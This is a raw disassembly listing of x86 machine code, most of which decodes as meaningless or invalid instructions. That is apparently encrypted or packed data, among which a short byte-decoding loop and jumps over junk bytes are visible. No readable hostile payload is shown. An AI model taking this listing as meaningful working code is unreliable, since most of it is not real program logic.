  403891:	shl    DWORD PTR [ebx],cl
  403893:	inc    eax
  403894:	pusha  
  403895:	in     al,0x46
  403897:	pusha  
  403898:	sub    BYTE PTR [esp+edx*2],dl
  40389b:	xor    bl,dl
  40389d:	js     0x403906
  40389f:	dec    esi
  4038a0:	jae    0x40391b
  4038a2:	imul   eax,DWORD PTR fs:[ecx-0x75],0xf5520e57
  4038aa:	mov    dl,0x6a
  4038ad:	outs   dx,BYTE PTR ds:[esi]
  4038ae:	popa   
  4038af:	inc    edi
  4038b0:	or     eax,0x63caf20f
  4038b5:	retf   0x325c
  4038b8:	jns    0x4038af
  4038ba:	inc    esp
  4038bb:	adc    cl,BYTE PTR [ecx]
  4038bd:	pop    esp
  4038be:	dec    edi
  4038bf:	call   0xf0c5:0xd4d814a3
  4038c6:	pop    edx
  4038c7:	inc    esi
  4038c8:	push   esp
  4038c9:	jle    0x4038d6
  4038cb:	in     eax,dx
  4038cc:	xchg   ecx,eax
  4038cd:	xor    DWORD PTR [ecx],eax
  4038cf:	je     0x4038e8
  4038d1:	push   0xffffffb9
  4038d3:	lds    edx,FWORD PTR [edi+0x17]
  4038d6:	into   
  4038d7:	xlat   BYTE PTR ds:[ebx]
  4038d8:	jmp    0xb9cfbb97
  4038dd:	cmp    al,0xa5
  4038df:	adc    DWORD PTR [esi+ebx*4],0x5c5f91b1
  4038e6:	sbb    al,0xe2
  4038e8:	ficom  DWORD PTR [edx-0xd4ff73c]
  4038ee:	or     al,0x77
  4038f0:	inc    eax
  4038f1:	hlt    
  4038f2:	stc    
  4038f3:	aas    
  4038f4:	clc    
  4038f5:	mov    DWORD PTR [esi-0x2c],eax
  4038f8:	adc    eax,DWORD PTR [edi+0x1a73c42b]
  4038fe:	jne    0x4038aa
  403900:	adc    bl,BYTE PTR [ebp+ebp*2+0x1]
  403904:	push   ebp
  403905:	aaa    
  403906:	sub    ah,0x5a
  403909:	shr    BYTE PTR [esi-0xcf3ada7],cl
  40390f:	dec    esi
  403910:	(bad)  
  403911:	int    0x75
  403913:	or     edx,ebx
  403915:	jge    0x40391e
  403917:	jne    0x403914
  403919:	(bad)  
  40391a:	xor    eax,0xd855a558
  40391f:	ins    BYTE PTR es:[edi],dx
  403920:	mov    esi,edi
  403922:	cwde   
  403923:	(bad)  
  403924:	push   edi
  403925:	unpcklps xmm5,XMMWORD PTR [eax+0x3f]
  403929:	scas   eax,DWORD PTR es:[edi]
  40392a:	add    BYTE PTR [edx-0x7f],dl
  40392d:	call   0xa1ca:0xac30155
  403934:	add    dh,BYTE PTR ds:0x1c1573be
  40393a:	pop    ss
  40393b:	scas   eax,DWORD PTR es:[edi]
  40393c:	sbb    eax,0x52b259d8
  403941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403942:	outs   dx,DWORD PTR ds:[esi]
  403943:	outs   dx,BYTE PTR ds:[esi]
  403944:	mov    cl,0x66
  403946:	adc    eax,ebx
  403948:	sub    ebp,DWORD PTR [edi-0x29fc29c9]
  40394e:	inc    esi
  40394f:	xchg   ebx,eax
  403950:	or     eax,0xb46caec0
  403955:	inc    esp
  403956:	dec    ebp
  403957:	fdiv   st,st(1)
  403959:	push   0xffffff86
  40395b:	pop    eax
  40395c:	int3   
  40395d:	xchg   ebp,eax
  40395e:	fiadd  DWORD PTR ds:0x55e4ce7b
  403964:	addr16 int3 
  403966:	aaa    
  403967:	into   
  403968:	sub    DWORD PTR [ecx+0xe],edi
  40396b:	pushf  
  40396c:	nop
  40396d:	mov    ds:0x87e563d1,al
  403972:	add    DWORD PTR [ecx-0x14],edi
  403975:	ds lahf 
  403977:	cwde   
  403978:	mov    ebx,0x5ad4015e
  40397d:	pop    ebp
  40397e:	cwde   
  40397f:	xchg   ebx,eax
  403980:	mov    ds:0xa80eb858,eax
  403985:	cmp    ebp,esi
  403987:	lock push ss
  403989:	aad    0xb0
  40398b:	inc    eax
  40398c:	pop    ebp
  40398d:	(bad)  
  40398e:	gs pop ss
  403990:	out    dx,eax
  403991:	ror    DWORD PTR [ebp+0x3fb3e71f],cl
  403997:	scas   eax,DWORD PTR es:[edi]
  403998:	jns    0x40394f
  40399a:	mov    ebp,0xeee2a80b
  40399f:	pop    es
  4039a0:	push   DWORD PTR [edi+0x1a]
  4039a3:	(bad)  
  4039a5:	outs   dx,BYTE PTR ds:[esi]
  4039a6:	pop    ds
  4039a7:	ja     0x4039f1
  4039a9:	cmp    eax,0x29b1c251
  4039ae:	(bad)  
  4039af:	cli    
  4039b0:	mov    DWORD PTR [edx+ebp*8+0x2a],ebx
  4039b4:	(bad)  
  4039b5:	cld    
  4039b6:	in     eax,0x1f
  4039b8:	(bad)  
  4039b9:	stc    
  4039ba:	pop    ss
  4039bb:	jg     0x4039ad
  4039bd:	add    al,0x49
  4039bf:	dec    edx
  4039c0:	icebp  
  4039c1:	sbb    ecx,esi
  4039c3:	jecxz  0x403a0e
  4039c5:	dec    edi
  4039c6:	iret   
  4039c7:	ins    BYTE PTR es:[edi],dx
  4039c8:	sbb    al,0xa2
  4039ca:	pop    edx
  4039cb:	das    
  4039cc:	mov    cl,0x69
  4039ce:	jns    0x403959
  4039d0:	jb     0x403982
  4039d2:	and    al,0xdf
  4039d4:	mov    al,BYTE PTR [edx]
  4039d6:	add    al,0x64
  4039d8:	(bad)  
  4039da:	mov    eax,0x14a0ae09
  4039df:	push   edi
  4039e0:	pop    esi
  4039e1:	popa   
  4039e2:	js     0x403a56
  4039e4:	sub    BYTE PTR [edx+0x50],dh
  4039e7:	arpl   ax,bp
  4039e9:	fstp   QWORD PTR [ebx-0x4a]
  4039ec:	xchg   DWORD PTR [esi],esp
  4039ee:	lock xor dl,BYTE PTR [ebp+0x1f]
  4039f2:	inc    esp
  4039f3:	in     eax,0x1a
  4039f5:	jg     0x403a71
  4039f7:	cmp    dh,ah
  4039f9:	sbb    al,0x14
  4039fb:	xor    cl,BYTE PTR [ebp+0x72]
  4039fe:	and    al,al
  403a00:	gs mov dl,ah
  403a03:	push   ebx
  403a04:	mov    esp,DWORD PTR [ecx-0x42655d42]
  403a0a:	adc    DWORD PTR [edi+0x14ac5815],eax
  403a10:	inc    esp
  403a11:	jns    0x4039e0
  403a13:	dec    ebp
  403a14:	jmp    0x403a12
  403a16:	jl     0x403a10
  403a18:	fimul  WORD PTR [eax]
  403a1a:	xchg   BYTE PTR [ebx+esi*1],al
  403a1d:	test   ch,ch
  403a1f:	loopne 0x4039d4
  403a21:	pop    ebx
  403a22:	jno    0x4039fe
  403a24:	dec    eax
  403a25:	and    al,0xf0
  403a27:	pushf  
  403a28:	into   
  403a29:	pop    ss
  403a2a:	test   DWORD PTR [edi-0x660a7aa5],edx
  403a30:	mov    al,ds:0x69ec24aa
  403a35:	adc    ch,BYTE PTR [eax]
  403a37:	out    0x8,eax
  403a39:	cld    
  403a3a:	data16 mov al,ds:0xc8adf27d
  403a40:	sbb    edx,DWORD PTR [eax]
  403a42:	mov    es,WORD PTR [edi-0x2fe101f4]
  403a48:	jecxz  0x403ab2
  403a4a:	in     al,0x5f
  403a4c:	push   ecx
  403a4d:	(bad)  
  403a4e:	imul   esp,DWORD PTR [edi-0x75],0x7d
  403a52:	cld    
  403a53:	jmp    0x403c5f
  403a58:	addr16 jo 0x403aaa
  403a5b:	or     BYTE PTR [ebx+0x33],cl
  403a5e:	arpl   WORD PTR [ebx+0x3c],si
  403a61:	aas    
  403a62:	cwde   
  403a63:	pop    ss
  403a64:	xlat   BYTE PTR ds:[ebx]
  403a65:	adc    DWORD PTR [ebx-0x29],edi
  403a68:	gs push ds
  403a6a:	jl     0x403ae8
  403a6c:	ins    DWORD PTR es:[edi],dx
  403a6d:	jg     0x403aeb
  403a6f:	jl     0x403a93
  403a71:	add    ch,ch
  403a73:	pop    esi
  403a74:	addr16 pop es
  403a76:	push   es
  403a77:	outs   dx,DWORD PTR ds:[esi]
  403a78:	push   esp
  403a79:	cmp    al,0xd4
  403a7b:	xor    esi,DWORD PTR [ecx+0x6c7acbd0]
  403a81:	out    dx,al
  403a82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a83:	xchg   esp,eax
  403a84:	jne    0x403afe
  403a86:	xchg   edi,eax
  403a87:	test   al,0xc
  403a89:	xor    ecx,ebp
  403a8b:	or     BYTE PTR ds:0xc92ec572,cl
  403a91:	out    dx,eax
  403a92:	sbb    ebx,DWORD PTR [ecx+0x514def64]
  403a98:	adc    dl,al
  403a9a:	(bad)  
  403a9b:	sub    bh,0x2a
  403a9e:	pop    esp
  403a9f:	pop    ds
  403aa0:	lods   al,BYTE PTR ds:[esi]
  403aa1:	imul   esp,DWORD PTR [ecx+0x1c],0x13
  403aa5:	int3   
  403aa6:	push   edi
  403aa7:	mov    edx,DWORD PTR [edx-0x6aa85a6c]
  403aad:	push   ecx
  403aae:	inc    ecx
  403aaf:	into   
  403ab0:	imul   esp,DWORD PTR [ecx+0x1b6f13a1],0xf0efb4ac
  403aba:	push   0xc70c31c4
  403abf:	nop
  403ac0:	out    dx,al
  403ac1:	cmp    eax,0xa08e28f8
  403ac6:	ret    0xec2e
  403ac9:	test   eax,0xafda7103
  403ace:	push   ebx
  403acf:	setb   al
  403ad2:	dec    ecx
  403ad3:	nop
  403ad4:	dec    ebx
  403ad5:	fldenv [ebp+0x3a]
  403ad8:	push   ecx
  403ad9:	leave  
  403ada:	adc    ecx,edi
  403adc:	mov    ch,0xec
  403ade:	jne    0x403ac4
  403ae0:	(bad)  
  403ae1:	in     al,dx
  403ae2:	mov    DWORD PTR [eax-0x748d9893],esp
  403ae8:	sbb    ebp,DWORD PTR [esi-0x64dadf9]
  403aee:	push   0xcb956ed6
  403af3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403af4:	cs mov dh,0x1d
  403af7:	dec    edx
  403af8:	call   0x1ea9:0xf499550d
  403aff:	in     eax,dx
  403b00:	pavgb  mm3,QWORD PTR [eax-0xa28cb1e]
  403b07:	fsubr  DWORD PTR [esi-0x4afca24a]
  403b0d:	mov    dl,0x5a
  403b0f:	clc    
  403b10:	push   esp
  403b11:	sub    al,0x84
  403b13:	pop    edx
  403b14:	cmp    BYTE PTR [ebp+0x5c017f84],dh
  403b1a:	imul   BYTE PTR [edi+eiz*8]
  403b1d:	imul   esi,DWORD PTR [ecx+0x35],0xa9ec4a28
  403b24:	(bad)  
  403b25:	retf   0xbfe7
  403b28:	xchg   edi,eax
  403b29:	(bad)  
  403b2a:	aas    
  403b2b:	cwde   
  403b2c:	je     0x403ac0
  403b2e:	xchg   edx,eax
  403b2f:	daa    
  403b30:	loopne 0x403ac5
  403b32:	sub    ebx,DWORD PTR [esi]
  403b34:	in     al,dx
  403b35:	leave  
  403b36:	lods   eax,DWORD PTR ds:[esi]
  403b37:	loopne 0x403b57
  403b39:	adc    al,0xda
  403b3b:	js     0x403b1f
  403b3d:	dec    edi
  403b3e:	push   ds
  403b3f:	sahf   
  403b40:	js     0x403ac9
  403b42:	leave  
  403b43:	lock cwde 
  403b45:	stc    
  403b46:	into   
  403b47:	hlt    
  403b48:	push   0x840b8ff
  403b4d:	inc    esp
  403b4e:	aad    0xe1
  403b50:	sub    bh,bl
  403b52:	fisubr WORD PTR [eax]
  403b54:	adc    edx,ebp
  403b56:	imul   edx,DWORD PTR [ecx+0x2d],0x6
  403b5a:	mov    al,0x21
  403b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b5d:	nop
  403b5e:	pop    ecx
  403b5f:	imul   ebp,edx,0x45
  403b62:	mov    al,0x35
  403b64:	and    ebx,esi
  403b66:	fsub   DWORD PTR [ebx]
  403b68:	ss ja  0x403b00
  403b6b:	data16 je 0x403b22
  403b6e:	stos   BYTE PTR es:[edi],al
  403b6f:	cmp    BYTE PTR [eax+0x3a09faeb],0x60
  403b76:	mov    ds:0xd4c0d89d,eax
  403b7b:	mov    cl,0x6
  403b7d:	and    eax,0x98666051
  403b82:	xchg   esi,eax
  403b83:	cmp    al,BYTE PTR [edi+0x4d292630]
  403b89:	es out 0xc8,al
  403b8c:	fcomp  DWORD PTR [esi+0x31]
  403b8f:	fistp  WORD PTR [ebx]
  403b91:	(bad)  
  403b92:	mov    eax,ds:0x4aac389f
  403b97:	adc    dh,al
  403b99:	sub    DWORD PTR [eax+ecx*4+0x7130d1d0],edx
  403ba0:	dec    ecx
  403ba1:	fisttp QWORD PTR [edi+0x64]
  403ba4:	pop    bx
  403ba6:	dec    edi
  403ba7:	mov    ebx,0x931d34a4
  403bac:	mov    ss,WORD PTR [eax-0x30cd527d]
  403bb2:	je     0x403ba2
  403bb4:	arpl   WORD PTR [edi-0x599fb5eb],si
  403bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bbb:	pop    esp
  403bbc:	push   esp
  403bbd:	or     al,0xd6
  403bbf:	mov    ch,0x7d
  403bc1:	mov    dh,0x50
  403bc3:	lock sar ch,0x3a
  403bc7:	stos   DWORD PTR es:[edi],eax
  403bc8:	mov    edx,0x7fa2fc8c
  403bcd:	scas   eax,DWORD PTR es:[edi]
  403bce:	adc    eax,0x444cc757
  403bd3:	js     0x403b9d
  403bd5:	cmc    
  403bd6:	xor    al,0x66
  403bd8:	adc    eax,0xa9faf986
  403bdd:	mov    ebx,es
  403bdf:	pop    esi
  403be0:	add    BYTE PTR [ebx+0x54],bh
  403be3:	xchg   esp,eax
  403be4:	jns    0x403b69
  403be6:	push   0x9d0f8219
  403beb:	push   es
  403bec:	enter  0xd82d,0xc4
  403bf0:	ror    esi,cl
  403bf2:	mov    bh,0x3
  403bf4:	shl    DWORD PTR [eax+0x7df33f56],cl
  403bfa:	pop    ds
  403bfb:	popf   
  403bfc:	mov    al,ds:0xae175250
  403c01:	ins    DWORD PTR es:[edi],dx
  403c02:	push   esp
  403c03:	sub    ah,BYTE PTR [eax+0x40]
  403c06:	mov    DWORD PTR [esi-0x6c9cb11a],ebp
  403c0c:	sti    
  403c0d:	aas    
  403c0e:	and    edx,DWORD PTR [ebx+edx*8]
  403c11:	aaa    
  403c12:	data16 mov bl,0xcd
  403c15:	sbb    eax,0x8da9f38
  403c1a:	dec    esp
  403c1b:	ret    0xa6b1
  403c1e:	mov    bl,0x73
  403c20:	imul   ecx,DWORD PTR [eax-0x5d],0x19ca970d
  403c27:	pop    esi
  403c28:	sar    BYTE PTR [ebx],cl
  403c2a:	fnstenv [edx+0x21b7b9d7]
  403c30:	bound  ebx,QWORD PTR [edi+ecx*2]
  403c33:	fiadd  WORD PTR [ebx+0x66]
  403c36:	ins    DWORD PTR es:[edi],dx
  403c37:	lock and DWORD PTR [ebp+0x6379f4e1],ebx
  403c3e:	stos   DWORD PTR es:[edi],eax
  403c3f:	pop    ss
  403c40:	(bad)
  403c43:	cmp    eax,0x3230f358
  403c48:	pop    ebp
  403c49:	iret   
  403c4a:	mov    bh,0xe4
  403c4c:	mov    bh,0x58
  403c4e:	scas   al,BYTE PTR es:[edi]
  403c4f:	or     BYTE PTR [esi],bl
  403c51:	sub    eax,0x7e5dcb47
  403c56:	and    DWORD PTR [ecx-0x45],0x45
  403c5a:	and    eax,0xf5884947
  403c5f:	xor    edi,ecx
  403c61:	add    edi,esi
  403c63:	mov    esi,DWORD PTR [ebp+0x8]
  403c66:	imul   edi,edx
  403c69:	mov    ebx,DWORD PTR [ebp+0xc]
  403c6c:	xor    eax,ecx
  403c6e:	add    eax,edx
  403c70:	mov    al,BYTE PTR [ebx+eax*1+0x32729a]
  403c77:	mov    BYTE PTR [edi+esi*1],al
  403c7a:	mov    eax,DWORD PTR [ebp-0x4]
  403c7d:	xor    eax,ecx
  403c7f:	lea    edx,[edx+eax*1+0x32729a]
  403c86:	mov    eax,DWORD PTR [ebp-0x4]
  403c89:	xor    eax,ecx
  403c8b:	mov    esi,0xffcd8d66
  403c90:	jmp    0x403e9c
  403c95:	dec    edi
  403c96:	push   ss
  403c97:	sbb    eax,DWORD PTR [ebp+ebp*2+0x7d]
  403c9b:	jae    0x403cae
  403c9d:	sti    
  403c9e:	adc    ebp,DWORD PTR ds:0x55102997
  403ca4:	fisttp QWORD PTR [edx+0x18]
  403ca7:	jl     0x403d25
  403ca9:	ins    DWORD PTR es:[edi],dx
  403caa:	jg     0x403d28
  403cac:	jl     0x403d01
  403cae:	sub    al,0x6d
  403cb0:	rcl    DWORD PTR [ebx],cl
  403cb2:	and    ebx,0x7bfde75b
  403cb8:	mov    BYTE PTR [ebx+ecx*2-0x5c81ca4c],dl
  403cbf:	out    0x21,eax
  403cc1:	xor    bh,ah
  403cc3:	in     al,0x62
  403cc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cc6:	push   ds
  403cc7:	sahf   
  403cc8:	add    eax,0xd98b3c77
  403ccd:	fstp   QWORD PTR [ebp-0x32]
  403cd0:	and    eax,0x3f4aea1c
  403cd5:	mov    ah,0xac
  403cd7:	jb     0x403cab
  403cd9:	jle    0x403cb8
  403cdb:	mov    cl,0x31
  403cdd:	add    BYTE PTR [ecx-0x7c8caa85],dl
  403ce3:	(bad)  
  403ce4:	lods   eax,DWORD PTR ds:[esi]
  403ce5:	add    DWORD PTR [ebx+0x7e],eax
  403ce8:	data16 adc BYTE PTR [edi+edi*2-0x8619d41],ch
  403cf0:	imul   edi,DWORD PTR [esi-0x3a],0xf42d3bc5
  403cf7:	mov    edi,0x8ce174b5
  403cfc:	pop    ebp
  403cfd:	sar    bl,cl
  403cff:	stos   DWORD PTR es:[edi],eax
  403d00:	arpl   dx,dx
  403d02:	push   0xdad2b07b
  403d07:	mov    esp,0x282d05da
  403d0c:	cmp    DWORD PTR [eax],esp
  403d0e:	xor    edx,DWORD PTR [ecx]
  403d10:	data16 mov ch,BYTE PTR [ecx-0x56b8047d]
  403d17:	es cs mov edi,0xd6b293f1
  403d1e:	add    al,0x0
  403d20:	es xor ah,ch
  403d23:	test   BYTE PTR [eax+0x74],cl
  403d26:	repnz (bad) 
  403d28:	(bad)  
  403d29:	cmp    DWORD PTR [edi],ecx
  403d2b:	jns    0x403d41
  403d2d:	pusha  
  403d2e:	dec    esp
  403d2f:	jp     0x403da1
  403d31:	xor    DWORD PTR [ebx+0x22],0xe313ea33
  403d38:	in     eax,dx
  403d39:	mov    ah,0x65
  403d3b:	or     BYTE PTR [edx+0x65],bl
  403d3e:	aas    
  403d3f:	add    dh,BYTE PTR [edi+0xdd6050b]
  403d45:	std    
  403d46:	jge    0x403cce
  403d48:	xor    esp,edi
  403d4a:	and    eax,0x2d9a845c
  403d4f:	(bad)  
  403d50:	sbb    al,0x8a
  403d52:	push   ebx
  403d53:	call   0xc517df81
  403d58:	mov    ebx,0x3cc01a8b
  403d5d:	sub    DWORD PTR [edi+0x28],eax
  403d60:	hlt    
  403d61:	jb     0x403d8b
  403d63:	je     0x403dd6
  403d65:	gs mov ebx,0xd5f45c55
  403d6b:	push   ebx
  403d6c:	mov    esp,0x22154d87
  403d71:	int3   
  403d72:	call   0x4b7f6998
  403d77:	ret    0xc7fc
  403d7a:	(bad)  
  403d7b:	stc    
  403d7c:	add    eax,0x2cac9bca
  403d81:	lods   al,BYTE PTR ds:[esi]
  403d82:	pop    es
  403d83:	add    al,BYTE PTR [edx+0x21]
  403d86:	push   ss
  403d87:	outs   dx,BYTE PTR ds:[esi]
  403d88:	xchg   edi,eax
  403d89:	aad    0x62
  403d8b:	mov    edx,0xd920962d
  403d90:	dec    edi
  403d91:	je     0x403d29
  403d93:	retf   0x96ca
  403d96:	sub    al,0xd4
  403d99:	shr    DWORD PTR [edi-0x2f33c4c4],0x88
  403da0:	hlt    
  403da1:	(bad)  
  403da2:	aam    0x41
  403da4:	adc    al,0x95
  403da6:	sub    eax,0xb8ad10d3
  403dab:	add    ebp,ebp
  403dad:	adc    al,0x4b
  403daf:	adc    BYTE PTR [ebp-0x5e],cl
  403db2:	sub    DWORD PTR [edx],edi
  403db4:	lods   eax,DWORD PTR ds:[esi]
  403db5:	enter  0xcc01,0x86
  403db9:	pop    ebx
  403dba:	xchg   DWORD PTR [ebp+0x72],edx
  403dbd:	jp     0x403dc3
  403dbf:	add    edi,DWORD PTR [esi]
  403dc1:	fs mov ecx,0xe2db43d7
  403dc7:	out    0x1e,eax
  403dc9:	outs   dx,DWORD PTR ds:[esi]
  403dca:	push   ss
  403dcb:	and    dh,cl
  403dcd:	clc    
  403dce:	lods   eax,DWORD PTR ds:[esi]
  403dcf:	ds in  al,0x9e
  403dd2:	xor    ch,bh
  403dd4:	gs push eax
  403dd6:	gs loopne 0x403dcd
  403dd9:	mov    esi,0x4930724e
  403dde:	xchg   BYTE PTR [edx-0x64988018],cl
  403de4:	ss daa 
  403de6:	cld    
  403de7:	jns    0x403e5c
  403de9:	mov    ds:0xe79ffcb6,al
  403dee:	dec    esp
  403def:	and    ebx,DWORD PTR [edx+0x28b4945d]
  403df5:	cld    
  403df6:	pop    ss
  403df7:	jecxz  0x403de5
  403df9:	sahf   
  403dfa:	stos   DWORD PTR es:[edi],eax
  403dfb:	adc    al,0x5
  403dfd:	inc    esi
  403dfe:	bound  edi,QWORD PTR [ecx+0x27]
  403e01:	lods   al,BYTE PTR ds:[esi]
  403e02:	hlt    
  403e03:	cwde   
  403e04:	sahf   
  403e05:	add    bh,BYTE PTR [ebx-0xa548d26]
  403e0b:	xor    ebx,DWORD PTR [eax+0xd]
  403e0e:	push   DWORD PTR [ecx+0x40]
  403e11:	(bad)  
  403e12:	xor    al,0xda
  403e14:	sub    al,0x58
  403e16:	ins    DWORD PTR es:[edi],dx
  403e17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e18:	aas    
  403e19:	sub    esp,0x88182e55
  403e1f:	int    0x30
  403e21:	inc    edi
  403e22:	inc    eax
  403e23:	sub    ah,al
  403e25:	gs ins BYTE PTR es:[edi],dx
  403e27:	hlt    
  403e28:	hlt    
  403e29:	dec    edi
  403e2a:	test   BYTE PTR [ebp-0x71],ch
  403e2d:	pop    es
  403e2e:	dec    ecx
  403e2f:	mov    WORD PTR [eax],cs
  403e31:	xchg   ebx,eax
  403e32:	(bad)  
  403e33:	cmp    eax,0x14f3edb9
  403e38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e39:	adc    DWORD PTR [eax-0x4a90c93a],ebp
  403e3f:	adc    esi,DWORD PTR [ebx-0xc]
  403e42:	or     ecx,DWORD PTR [eax]
  403e44:	sti    
  403e45:	sbb    ecx,DWORD PTR [ebx-0x25d710ec]
  403e4b:	xor    DWORD PTR [edx-0x5d],ebp
  403e4e:	mov    al,es:0xa6c8bdac
  403e54:	mov    DWORD PTR ds:0x47921448,esi
  403e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e5b:	outs   dx,DWORD PTR ds:[esi]
  403e5c:	push   ebp
  403e5d:	push   edx
  403e5e:	cmp    DWORD PTR [eax+0x11],eax
  403e61:	xchg   ecx,eax
  403e62:	or     al,0xf7
  403e64:	int3   
  403e65:	jmp    0x8c6b:0x33ebd5c1
  403e6c:	add    al,0xca
  403e6e:	mov    ebx,0x6b42838
  403e73:	test   eax,0x3be3ce64
  403e78:	cmc    
  403e79:	jno    0x403e17
  403e7b:	call   0x806e:0xd62352cf
  403e82:	push   edi
  403e83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e84:	and    bl,BYTE PTR [ebx-0x7b]
  403e87:	int3   
  403e88:	or     al,0xae
  403e8a:	ja     0x403e8c
  403e8c:	jbe    0x403ef6
  403e8e:	inc    dl
  403e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e92:	adc    al,0x6b
  403e94:	nop
  403e95:	sbb    al,BYTE PTR [ecx-0x66063e02]
  403e9b:	dec    ebx
  403e9c:	sub    esi,eax
  403e9e:	add    esi,DWORD PTR [ebp+0x10]
  403ea1:	cmp    edx,esi
  403ea3:	jbe    0x403630
  403ea9:	pop    ebx
  403eaa:	mov    eax,0xf89c8534
  403eaf:	pop    edi
  403eb0:	pop    esi
  403eb1:	leave  
  403eb2:	ret    0xc
  403eb5:	push   ebp
  403eb6:	mov    ebp,esp
  403eb8:	mov    eax,DWORD PTR [ebp+0xc]
  403ebb:	xor    edx,edx
  403ebd:	mov    ecx,0x7264fcad
  403ec2:	div    ecx
  403ec4:	mov    ecx,DWORD PTR [ebp+0x10]
  403ec7:	and    ecx,eax
  403ec9:	jmp    0x4040d5
  403ece:	(bad)  
  403ecf:	addr16 jns 0x403f24
  403ed2:	icebp  
  403ed3:	jb     0x403f28
  403ed5:	ins    DWORD PTR es:[edi],dx
  403ed6:	add    al,0x2a
  403ed8:	pop    esi
  403ed9:	push   0xaa6821f0
  403ede:	mov    ebx,0x6d7c7c1a
  403ee3:	jg     0x403f61
  403ee5:	jl     0x403e90
  403ee7:	fst    st(0)
  403ee9:	and    al,0x1d
  403eeb:	push   cs
  403eec:	jns    0x403efe
  403eee:	hlt    
  403eef:	and    BYTE PTR [eax+0x32],ah
  403ef2:	xchg   ebx,eax
  403ef3:	fdivr  st(7),st
  403ef5:	stc    
  403ef6:	push   ss
  403ef7:	mov    cs,WORD PTR [edi-0x4e036f9c]
  403efd:	sahf   
  403efe:	add    edi,ebx
  403f00:	mov    al,0x9c
  403f02:	jge    0x403f26
  403f04:	cmp    BYTE PTR [ecx-0xa],cl
  403f07:	call   0x8866820
  403f0c:	or     eax,0x779761b
  403f11:	inc    edx
  403f12:	push   edi
  403f13:	push   0x469ce1ec
  403f18:	stc    
  403f19:	pop    es
  403f1a:	retf   0xb75d
  403f1d:	stos   DWORD PTR es:[edi],eax
  403f1e:	in     eax,dx
  403f1f:	arpl   WORD PTR [esi],sp
  403f21:	in     al,dx
  403f22:	add    DWORD PTR [edi],esp
  403f24:	int    0xd9
  403f26:	pop    esi
  403f27:	and    eax,0xfeccb2a2
  403f2c:	retf   
  403f2d:	jbe    0x403f4b
  403f2f:	clc    
  403f30:	mov    esi,DWORD PTR [edi-0x74f83d40]
  403f36:	pusha  
  403f37:	jbe    0x403ebd
  403f39:	push   es
  403f3a:	add    BYTE PTR [ebx],0x7
  403f3d:	mov    eax,ds:0x2766996f
  403f42:	mov    ebp,0x791066e
  403f47:	sub    ebx,esi
  403f49:	mov    al,ds:0x955d5732
  403f4e:	mov    edi,0xc8e77aec
  403f53:	jmp    0x5dd93b6b
  403f58:	sbb    eax,eax
  403f5a:	jbe    0x403f9b
  403f5c:	dec    eax
  403f5d:	mov    ah,0xa8
  403f5f:	add    ebx,DWORD PTR [ebp-0x12b3d5d7]
  403f65:	retfw  
  403f67:	jmp    0xb5f278
  403f6c:	fadd   DWORD PTR [edi+0x448b907]
  403f72:	sub    al,BYTE PTR [edi+0x7af255e5]
  403f78:	jne    0x403f35
  403f7a:	lods   al,BYTE PTR ds:[esi]
  403f7b:	fcomi  st,st(5)
  403f7d:	ret    
  403f7e:	pop    esi
  403f7f:	imul   ebx,DWORD PTR [edx],0x9b5b1aca
  403f85:	fdivr  QWORD PTR ds:0xb73e9cc2
  403f8b:	jb     0x403f52
  403f8d:	jnp    0x403faf
  403f8f:	inc    esp
  403f90:	(bad)  
  403f91:	fistp  WORD PTR [edx]
  403f93:	mov    eax,ds:0xea36f765
  403f98:	inc    eax
  403f99:	adc    cl,BYTE PTR [esi+0x2b1d00ef]
  403f9f:	xchg   BYTE PTR [edx],ah
  403fa1:	sbb    BYTE PTR [esi+0x2eface85],ch
  403fa7:	std    
  403fa8:	shr    DWORD PTR [ebp+0x16],1
  403fab:	(bad)  
  403fac:	ds and eax,0x99f64913
  403fb2:	push   edx
  403fb3:	div    DWORD PTR [edi-0x31]
  403fb6:	push   esp
  403fb7:	in     al,dx
  403fb8:	sahf   
  403fb9:	retf   0x4cd4
  403fbc:	lods   eax,DWORD PTR ds:[esi]
  403fbd:	pop    eax
  403fbe:	sub    BYTE PTR [ebp-0x18],dh
  403fc1:	mov    edx,0xb3b552a2
  403fc6:	mov    dl,0x74
  403fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fc9:	mov    bh,0x96
  403fcb:	call   0x8c43:0xe2d143de
  403fd2:	jp     0x404000
  403fd4:	sub    al,0x5d
  403fd6:	adc    edx,DWORD PTR [edx+0x40f838de]
  403fdc:	xchg   esp,eax
  403fdd:	pusha  
  403fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fdf:	loope  0x404004
  403fe1:	push   esi
  403fe2:	mov    bl,0x9e
  403fe4:	pop    ds
  403fe5:	sbb    eax,0x9bfcbada
  403fea:	cli    
  403feb:	xchg   BYTE PTR [ebx+0x387f636d],cl
  403ff1:	das    
  403ff2:	addr16 pop edi
  403ff4:	mov    ebx,0xcc5fb773
  403ff9:	daa    
  403ffa:	mov    eax,0x3be4cb3c
  403fff:	enter  0xd96e,0x60
  404003:	dec    edx
  404004:	sahf   
  404005:	cmp    eax,ebp
  404007:	jmp    0x13457a41
  40400c:	push   ebx
  40400d:	pop    ds
  40400e:	mov    al,ds:0xca00656e
  404013:	mov    dl,0x46
  404015:	sub    al,0xf4
  404017:	adc    al,0x15
  404019:	in     al,dx
  40401a:	rcl    DWORD PTR [eax],1
  40401c:	data16 ja 0x40400a
  40401f:	rcl    DWORD PTR [ecx],0xe3
  404022:	mov    ebp,ds
  404024:	sub    dl,BYTE PTR [edx]
  404026:	mov    cl,0x69
  404028:	inc    edi
  404029:	inc    ecx
  40402a:	xchg   ecx,eax
  40402b:	mov    dh,0xe1
  40402d:	add    eax,0xea6b5fec
  404032:	xabort 0xc1
  404035:	int3   
  404036:	(bad)  
  404037:	xor    BYTE PTR [eax+ebx*8],dh
  40403a:	jge    0x40407a
